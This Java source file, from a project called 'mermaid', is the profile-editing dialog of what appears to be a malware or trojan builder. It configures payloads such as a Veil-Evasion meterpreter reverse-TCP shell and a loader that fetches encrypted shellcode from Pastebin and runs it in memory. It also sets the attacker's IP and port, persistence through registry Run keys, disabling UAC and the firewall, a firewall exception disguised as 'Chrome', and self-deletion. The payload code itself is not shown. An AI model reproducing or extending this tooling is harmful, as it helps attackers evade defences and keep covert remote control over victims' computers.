package net.jlxip.mermaid;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.regex.Pattern;

import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.border.LineBorder;

public class EditProfile extends JDialog {
	private static final long serialVersionUID = 1L;
	
	Main MAIN;          // Creamos una variable vacía para almacenar una instancia de Main
    Boolean EDIT;       // Variable global para saber si estamos CREANDO o EDITANDO un perfil
    Profile oldProfile; // Variable global para almacenar el perfil a editar
    
	private JTextField name;
	private JTextField ip;
	private JTextField port;
	private JTextField manualenvTEXT;
	private JTextField manualTEXT;
	private JTextField additionalfolderTEXT;
	private JTextField file;
	private JTextField hkcu;
	private JTextField hklm;
	private JTextField exceptionname;
	private JRadioButton appdata;
	private JRadioButton temp;
	private JRadioButton programfiles;
	private JRadioButton manualenv;
	private JRadioButton manual;
	private JCheckBox additionalfolder;
	private JCheckBox disableuac;
	private JCheckBox disablefirewall;
	private JCheckBox addfirewallexception;
	private JCheckBox melt;
	private JPanel panel_4;
	private JRadioButton VeilEvasion;
	private JRadioButton MerCode;
	private JRadioButton MerCodeBin;
	private JPanel connectionPanel;
	
	private String SHELLCODE = null;
	

	/**
	 * Create the dialog.
	 */
	/**
	 * @wbp.parser.constructor
	 * */
	public EditProfile(java.awt.Frame parent, boolean model, Main recvMain) {
		super(parent, model);
		setTitle("Edit profile");
        MAIN = recvMain;    // RELLENAMOS VARIABLES GLOBALES
        EDIT = false;       // "
        runComponents();
        this.setLocationRelativeTo(null);       // Centramos la ventana en la pantalla
	}
	
    private JLabel lblNoticeThisTab;
	public EditProfile(java.awt.Frame parent, boolean model, Main recvMain, Profile profile){
        super(parent, model);
        MAIN = recvMain;      // RELLENAMOS VARIABLES GLOBALES
        EDIT = true;          // "
        oldProfile = profile; // "
        runComponents();
        this.setLocationRelativeTo(null);       // Centramos la ventana en la pantalla
        
        switch(profile.EXPLOIT) {
        	case "VEILEVASION":
        		VeilEvasion.setSelected(true);
        		break;
        	case "MERCODE":
        		SHELLCODE = profile.SHELLCODE;
        		MerCode.setSelected(true);
        		break;
        	case "MERCODEBIN":
        		SHELLCODE = profile.SHELLCODE;
        		MerCodeBin.setSelected(true);
        		break;
        }
        
        // Rellenamos los JTextFields con los datos del perfil seleccionado
        name.setText(profile.NAME);
        ip.setText(profile.IP);
        port.setText(profile.PORT);
        
        switch(profile.PATH){
            case "%APPDATA%":   // Si la PATH del profile es %APPDATA%
                appdata.setSelected(true);  // Habilitamos el JRadioButton
                UpdateRadios();     // Y actualizamos la vista
                break;
            case "%TEMP%":                      // Lo mismo de antes
                temp.setSelected(true);         // "
                UpdateRadios();                 // "
                break;                          // "
            case "%PROGRAMFILES%":              // "
                programfiles.setSelected(true); // "
                UpdateRadios();                 // "
                break;                          // "
            default:    // Si no es nada de lo anterior...
                Pattern raw_upperdots_pattern = Pattern.compile(Pattern.quote("•"));    // Creamos un patrón con el símbolo •
                String[] upperdots = raw_upperdots_pattern.split(profile.PATH); // Creamos un array de Strings con el símbolo anterior
                if(upperdots.length>1){ // Si hay al menos uno...
                    if(upperdots[0].equals("ENV")){ // Y lo que hay detrás es "ENV"...
                        manualenv.setSelected(true);     // Seleccionamos el MANUALEV
                        UpdateRadios();     // Actualizamos la vista
                        manualenvTEXT.setText(upperdots[1]);     // Y establecemos el texto
                    }
                } else {    // De otro modo...
                    manual.setSelected(true);   // Seleccionamos el MANUAL
                    UpdateRadios();         // Actualizamos la vista
                    manualTEXT.setText(profile.PATH);           // Y establecemos el texto
                }
        }
        
        file.setText(profile.FILE);
        
        if(profile.ADFOLDER.equals("NULL") || profile.ADFOLDER.equals("")){        // Si ADFOLDER es "NULL"...
            additionalfolder.setSelected(false);    // Deseleccionamos el additionalfolder
            additionalfolderTEXT.setText("");       // Vaciamos el TEXT
            additionalfolderTEXT.setEnabled(false);     // Y deshabilitamos el text
        } else {        // De otro modo...
            additionalfolder.setSelected(true);     // Seleccionamos el additionalfolder
            additionalfolderTEXT.setText(profile.ADFOLDER);     // Establecemos el texto
            additionalfolderTEXT.setEnabled(true);      // Y habilitamos el texto
        }
        
        if(profile.HKCU.equals("NULL")){    // Si HKCU es "NULL"...
            hkcu.setText("");   // Lo dejamos vacío
        } else {    // De otro modo...
            hkcu.setText(profile.HKCU); // Lo dejamos como estaba
        }
        
        if(profile.HKLM.equals("NULL")){    // Lo mismo con HKLM
            hklm.setText("");
        } else {
            hklm.setText(profile.HKLM);
        }
        
        if(profile.DISABLEUAC.equals("TRUE")){
            disableuac.setSelected(true);
        } else {
            disableuac.setSelected(false);
        }
        
        if(profile.DISABLEFIREWALL.equals("TRUE")){
            disablefirewall.setSelected(true);
        } else {
            disablefirewall.setSelected(false);
        }
        
        if(profile.ADDFIREWALL.equals("NULL")){
            addfirewallexception.setSelected(false);
            exceptionname.setText("");
        } else {
            addfirewallexception.setSelected(true);
            exceptionname.setEnabled(true);
            exceptionname.setText(profile.ADDFIREWALL);
        }
        
        if(profile.MELT.equals("TRUE")){
            melt.setSelected(true);
        } else {
            melt.setSelected(false);
        }
    }
	
	public void runComponents() {
		setResizable(false);
		setBounds(100, 100, 450, 562);
		getContentPane().setLayout(null);
		{
			JLabel lblNewLabel = new JLabel("Profile Name:");
			lblNewLabel.setBounds(12, 16, 78, 16);
			getContentPane().add(lblNewLabel);
		}
		
		name = new JTextField();
		name.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		name.setBounds(102, 10, 318, 28);
		getContentPane().add(name);
		name.setColumns(10);
		
		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		tabbedPane.setBounds(12, 49, 408, 415);
		getContentPane().add(tabbedPane);
		
		panel_4 = new JPanel();
		tabbedPane.addTab("Exploit", null, panel_4, null);
		panel_4.setLayout(null);
		
		ButtonGroup ExploitBG = new ButtonGroup();
		
		VeilEvasion = new JRadioButton("[DEFAULT] Veil-Evasion's c/meterpreter/rev_tcp");
		VeilEvasion.setToolTipText("The payload c/meterpreter/rev_tcp (deofuscated by JlXip)");
		VeilEvasion.setSelected(true);
		VeilEvasion.setBounds(8, 9, 387, 25);
		ExploitBG.add(VeilEvasion);
		panel_4.add(VeilEvasion);
		
		MerCodeBin = new JRadioButton("MerCodeBin");
		MerCodeBin.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(SHELLCODE == null || SHELLCODE.equals("")) SHELLCODE = JOptionPane.showInputDialog(null, "Enter shellcode (\\x00)");
				if(SHELLCODE == null || SHELLCODE.equals("")) {
					VeilEvasion.setSelected(true);
					return;
				}
				
				File FPastebinAPIDevKey = new File("MerCodeBin.dat");
				if(!FPastebinAPIDevKey.exists()) {
					String PastebinAPIDevKey = JOptionPane.showInputDialog(null, "Enter your Pastebin API Dev Key");
					if(PastebinAPIDevKey == null || PastebinAPIDevKey.equals("")) {
						VeilEvasion.setSelected(true);						
						return;
					}
					
					try {
						FileOutputStream fos = new FileOutputStream(FPastebinAPIDevKey);
						
						fos.write(PastebinAPIDevKey.getBytes());
						
						fos.close();
					} catch(IOException ioe) {
						// No debería de llamarse.
					}
				}
			}
		});
		MerCodeBin.setToolTipText("JlXip's MerCodeBin Exploit: downloads a previously uploaded encrypted shellcode from Pastebin and executes it in memory.");
		MerCodeBin.setBounds(8, 69, 387, 25);
		ExploitBG.add(MerCodeBin);
		panel_4.add(MerCodeBin);
		
		JLabel lblTooltipsWillOffer = new JLabel("Tooltips will offer more information about each exploit.");
		lblTooltipsWillOffer.setBounds(8, 356, 383, 16);
		panel_4.add(lblTooltipsWillOffer);
		
		MerCode = new JRadioButton("MerCode");
		MerCode.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(SHELLCODE == null || SHELLCODE.equals("")) SHELLCODE = JOptionPane.showInputDialog(null, "Enter shellcode (\\x00)");
				if(SHELLCODE == null || SHELLCODE.equals("")) {
					VeilEvasion.setSelected(true);
					return;
				}
			}
		});
		MerCode.setBounds(8, 39, 387, 25);
		ExploitBG.add(MerCode);
		panel_4.add(MerCode);
		
		connectionPanel = new JPanel();
		tabbedPane.addTab("Connection", null, connectionPanel, null);
		connectionPanel.setLayout(null);
		
		JLabel lblNewLabel_1 = new JLabel("IP/DNS:");
		lblNewLabel_1.setBounds(12, 16, 45, 16);
		connectionPanel.add(lblNewLabel_1);
		
		ip = new JTextField();
		ip.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		ip.setBounds(63, 10, 328, 28);
		connectionPanel.add(ip);
		ip.setColumns(10);
		
		JLabel lblNewLabel_2 = new JLabel("PORT:");
		lblNewLabel_2.setBounds(12, 49, 37, 16);
		connectionPanel.add(lblNewLabel_2);
		
		port = new JTextField();
		port.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		port.setBounds(57, 43, 108, 28);
		connectionPanel.add(port);
		port.setColumns(10);
		
		lblNoticeThisTab = new JLabel("Notice: this tab is only needed when using Veil Evasion's exploit.");
		lblNoticeThisTab.setBounds(12, 356, 379, 16);
		connectionPanel.add(lblNoticeThisTab);
		
		JPanel panel_1 = new JPanel();
		tabbedPane.addTab("Installation", null, panel_1, null);
		panel_1.setLayout(null);
		
		JPanel panel_3 = new JPanel();
		panel_3.setBorder(new LineBorder(new Color(0, 0, 0)));
		panel_3.setBounds(12, 13, 379, 239);
		panel_1.add(panel_3);
		panel_3.setLayout(null);
		
		JLabel lblNewLabel_3 = new JLabel("Installation path");
		lblNewLabel_3.setBounds(12, 13, 91, 16);
		panel_3.add(lblNewLabel_3);
		
		ButtonGroup PathBG = new ButtonGroup();
		
		temp = new JRadioButton("%TEMP%");
		temp.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				UpdateRadios();
			}
		});
		temp.setSelected(true);
		temp.setBounds(12, 38, 127, 25);
		PathBG.add(temp);
		panel_3.add(temp);
		
		appdata = new JRadioButton("%APPDATA%");
		appdata.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				UpdateRadios();
			}
		});
		appdata.setBounds(12, 68, 127, 25);
		PathBG.add(appdata);
		panel_3.add(appdata);
		
		programfiles = new JRadioButton("%PROGRAMFILES%");
		programfiles.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				UpdateRadios();
			}
		});
		programfiles.setBounds(12, 98, 143, 25);
		PathBG.add(programfiles);
		panel_3.add(programfiles);
		
		manualenv = new JRadioButton("Manual environment var");
		manualenv.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				UpdateRadios();
			}
		});
		manualenv.setBounds(12, 128, 167, 25);
		PathBG.add(manualenv);
		panel_3.add(manualenv);
		
		manual = new JRadioButton("Manual");
		manual.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				UpdateRadios();
			}
		});
		manual.setBounds(12, 164, 69, 25);
		PathBG.add(manual);
		panel_3.add(manual);
		
		additionalfolder = new JCheckBox("Additional folder");
		additionalfolder.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if(additionalfolder.isSelected()){           // Si la opción Additional Directory está activada...
		            additionalfolderTEXT.setEnabled(true);   // Habilitar la entrada de texto
		        } else {    // De otro modo...
		            additionalfolderTEXT.setEnabled(false);  // Deshabilitar
		        }
			}
		});
		additionalfolder.setSelected(true);
		additionalfolder.setBounds(12, 208, 121, 25);
		panel_3.add(additionalfolder);
		
		manualenvTEXT = new JTextField();
		manualenvTEXT.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		manualenvTEXT.setEnabled(false);
		manualenvTEXT.setText("%HOMEDRIVE%");
		manualenvTEXT.setBounds(187, 129, 180, 28);
		panel_3.add(manualenvTEXT);
		manualenvTEXT.setColumns(10);
		
		manualTEXT = new JTextField();
		manualTEXT.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		manualTEXT.setEnabled(false);
		manualTEXT.setText("C:\\WINDOWS");
		manualTEXT.setBounds(89, 162, 278, 28);
		panel_3.add(manualTEXT);
		manualTEXT.setColumns(10);
		
		additionalfolderTEXT = new JTextField();
		additionalfolderTEXT.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		additionalfolderTEXT.setText("MyPersistantFolder");
		additionalfolderTEXT.setBounds(141, 206, 226, 28);
		panel_3.add(additionalfolderTEXT);
		additionalfolderTEXT.setColumns(10);
		
		JLabel lblInstallationFolder = new JLabel("Installation file:");
		lblInstallationFolder.setBounds(12, 278, 88, 16);
		panel_1.add(lblInstallationFolder);
		
		file = new JTextField();
		file.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		file.setBounds(112, 272, 279, 28);
		panel_1.add(file);
		file.setColumns(10);
		
		JLabel lblForExampleConnectorexe = new JLabel("Example: connector.exe");
		lblForExampleConnectorexe.setBounds(12, 304, 165, 16);
		panel_1.add(lblForExampleConnectorexe);
		
		JPanel panel_2 = new JPanel();
		tabbedPane.addTab("Persistance and Extras", null, panel_2, null);
		panel_2.setLayout(null);
		
		JLabel lblHkcu = new JLabel("HKCU:");
		lblHkcu.setBounds(12, 16, 47, 16);
		panel_2.add(lblHkcu);
		
		hkcu = new JTextField();
		hkcu.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		hkcu.setBounds(60, 10, 331, 28);
		panel_2.add(hkcu);
		hkcu.setColumns(10);
		
		JLabel lblHklm = new JLabel("HKLM:");
		lblHklm.setBounds(12, 56, 47, 16);
		panel_2.add(lblHklm);
		
		hklm = new JTextField();
		hklm.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		hklm.setBounds(60, 50, 331, 28);
		panel_2.add(hklm);
		hklm.setColumns(10);
		
		JLabel lblLeaveInBlank = new JLabel("Leave in blank if not used.");
		lblLeaveInBlank.setBounds(12, 85, 149, 16);
		panel_2.add(lblLeaveInBlank);
		
		disableuac = new JCheckBox("Disable UAC");
		disableuac.setBounds(12, 110, 97, 25);
		panel_2.add(disableuac);
		
		disablefirewall = new JCheckBox("Disable Firewall");
		disablefirewall.setBounds(12, 143, 119, 25);
		panel_2.add(disablefirewall);
		
		addfirewallexception = new JCheckBox("Add Firewall exception");
		addfirewallexception.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if(addfirewallexception.isSelected()){
		            disablefirewall.setSelected(false);
		            disablefirewall.setEnabled(false);
		            exceptionname.setEnabled(true);
		        } else {
		            disablefirewall.setEnabled(true);
		            exceptionname.setEnabled(false);
		        }
			}
		});
		addfirewallexception.setBounds(12, 176, 157, 25);
		panel_2.add(addfirewallexception);
		
		exceptionname = new JTextField();
		exceptionname.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		exceptionname.setEnabled(false);
		exceptionname.setText("Chrome");
		exceptionname.setBounds(177, 174, 214, 28);
		panel_2.add(exceptionname);
		exceptionname.setColumns(10);
		
		melt = new JCheckBox("Melt (might not work)");
		melt.setBounds(12, 218, 157, 25);
		panel_2.add(melt);
		
		JButton btnNewButton = new JButton("SAVE");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				Finish();
			}
		});
		btnNewButton.setBounds(12, 477, 408, 25);
		getContentPane().add(btnNewButton);
	}
	
	public void UpdateRadios(){
        if(manualenv.isSelected()){
            manualenvTEXT.setEnabled(true);
        } else {
            manualenvTEXT.setEnabled(false);
        }
        
        if(manual.isSelected()){
            manualTEXT.setEnabled(true);
        } else {
            manualTEXT.setEnabled(false);
        }
    }
	
	
	public void Finish(){   // Método llamado por cada posible indicio de finalizar
        // Guardamos en variables los datos de los fields
        String NAME = name.getText();
        
        String EXPLOIT = "";
        if(VeilEvasion.isSelected()) EXPLOIT = "VEILEVASION";
        else if(MerCode.isSelected()) EXPLOIT = "MERCODE";
        else if(MerCodeBin.isSelected()) EXPLOIT = "MERCODEBIN";
        
        String IP = ip.getText();
        String PORT = port.getText();
        
        String PATH = "";           // Creamos una variable vacía para la ruta
        if(appdata.isSelected()){   // Si APPDATA está seleccionado
            PATH = "%APPDATA%";     // Ponemos %APPDATA%
        } else if(temp.isSelected()){   // Si TEMP está seleccionado
            PATH = "%TEMP%";            // Ponemos %TEMP%
        } else if(programfiles.isSelected()){   // Si PROGRAMFILES está seleccionado
            PATH = "%PROGRAMFILES%";        // Ponemos %PROGRAMFILES%
        } else if(manualenv.isSelected()){       // Si MANUALEV está seleccionado
            PATH = "ENV•"+manualenvTEXT.getText();       // Ponemos ENV• y el texto
        } else if(manual.isSelected()){     // Si MANUAL está seleccionado
            PATH = manualTEXT.getText();        // Ponemos directamente el texto
        }
        
        String ADFOLDER = "";       // Creamos un String vacío para la carpeta extra
        if(additionalfolder.isSelected()){      // Si está seleccionada la opción
            ADFOLDER = additionalfolderTEXT.getText();      // La escribimos en la variable
        }
        
        String FILE = file.getText();
        String HKCU = hkcu.getText();
        String HKLM = hklm.getText();
        
        String DISABLEUAC = "";
        if(disableuac.isSelected()){
            DISABLEUAC = "TRUE";
        } else {
            DISABLEUAC = "FALSE";
        }
        
        String DISABLEFIREWALL = "";
        if(disablefirewall.isSelected()){
            DISABLEFIREWALL = "TRUE";
        } else {
            DISABLEFIREWALL = "FALSE";
        }
        
        String ADDFIREWALL="";
        if(addfirewallexception.isSelected()){
            ADDFIREWALL=exceptionname.getText();
        } else {
            ADDFIREWALL="NULL";
        }
        
        String MELT="";
        if(melt.isSelected()){
            MELT = "TRUE";
        } else {
            MELT = "FALSE";
        }
        
        // Comprobamos que todos los JTextFields tienen datos, de otro modo, lanzamos un error.
        if(NAME.equals("")){
            JOptionPane.showMessageDialog(this, "You've to introduce a profile name!");
            return;
        }
        if(IP.equals("") && VeilEvasion.isSelected()){
            JOptionPane.showMessageDialog(this, "You've to introduce IP/DNS!");
            return;
        }
        if(PORT.equals("") && VeilEvasion.isSelected()){
            JOptionPane.showMessageDialog(this, "You've to introduce a port!");
            return;
        }
        if(FILE.equals("")){
            JOptionPane.showMessageDialog(this, "You've to introduce an installation file!");
            return;
        }
        
        String oldData = "";    // Creamos una variable para almacenar el archivo "profiles.dat" como está ahora

        if(EDIT) {  // Si vamos a editar un perfil...
            String oldProfileSTR = oldProfile.getString();      // Creamos una variable para almacenar el String del perfil seleccionado
            
            // ALMACENAR DATOS ACTUALES
            File oldFile = new File("profiles.dat");    // Abrimos el archivo "profiles.dat"
            try{
                FileReader oldFileReader = new FileReader(oldFile);                     // ABRIMOS EL ARCHIVO PARA LEERLO
                BufferedReader oldBufferedReader = new BufferedReader(oldFileReader);   // "
                
                String lastLine = "";    // Creamos una variable vacía para almacenar la última línea leída
                while((lastLine=oldBufferedReader.readLine())!=null){   // Mientras no se acabe el archivo
                    if(!lastLine.equals(oldProfileSTR)){    // Y la línea leída no sea igual a la que hemos editado
                        oldData = oldData + lastLine + "\n";    // La añadimos a la variable oldData con un salto de línea al final
                    }
                }
                oldBufferedReader.close();  // Cerramos...
                oldFileReader.close();      // "
            } catch (FileNotFoundException ex) {
                ex.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        } else {    // Si lo que estamos haciendo es crear un nuevo perfil...
            // ALMACENAR DATOS ACTUALES
            File oldFile = new File("profiles.dat");    // Abrimos archivo "profiles.dat"
            if(!oldFile.exists() || !oldFile.isFile()) {
            	try {
            		oldFile.createNewFile();
            	} catch(IOException ioe) {
            		// No debería de llamarase
            	}
            }
            try{
                FileReader oldFileReader = new FileReader(oldFile);                     // Abrimos el archivo para leerlo
                BufferedReader oldBufferedReader = new BufferedReader(oldFileReader);   // "

                String lastLine = "";   // Creamos una variable vacía con la última línea leída
                while((lastLine=oldBufferedReader.readLine())!=null){   // Mientras no se acabe el archivo
                    oldData = oldData + lastLine + "\n";    // Añadimos  a la variable oldData la línea actual con un salto de línea al final
                }

                oldBufferedReader.close();      // Cerramos...
                oldFileReader.close();          // "
            } catch (FileNotFoundException ex) {
                ex.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        
        // GUARDAR NUEVOS DATOS
        Profile profile = new Profile(NAME, EXPLOIT, IP, PORT, PATH, FILE, ADFOLDER, HKCU, HKLM, DISABLEUAC, DISABLEFIREWALL, ADDFIREWALL, MELT, SHELLCODE);  // Creamos un nuevo perfil con los datos

        try{
            File file = new File("profiles.dat");       // Abrimos el archivo "profiles.dat"
            FileWriter fileWriter = new FileWriter(file);       // Preparamos para escribir en él...
            PrintWriter printWriter = new PrintWriter(file);    // "

            printWriter.write(oldData); // Escribimos todos los datos antiguos
            printWriter.write(profile.getString()+"\n");    // Y también escribimos el String del perfil nuevo, con un salto de línea al final

            printWriter.close();    // Cerramos...
            fileWriter.close();     // "
        } catch (FileNotFoundException ex) {
            ex.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        
        MAIN.UpdateList();  // Actualizamos la lista de perfiles
        dispose();      // Y cerramos la ventana actual
    }
}
